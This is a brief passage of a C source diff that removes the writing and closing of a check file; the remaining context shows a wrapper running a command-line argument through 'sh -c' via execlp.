-        fputs(message, check_file);
-        fclose(check_file);
-    }
 
     if (command || argc == 2) {
         execlp("sh", "sh", "-c", argv[1], (char *)0);
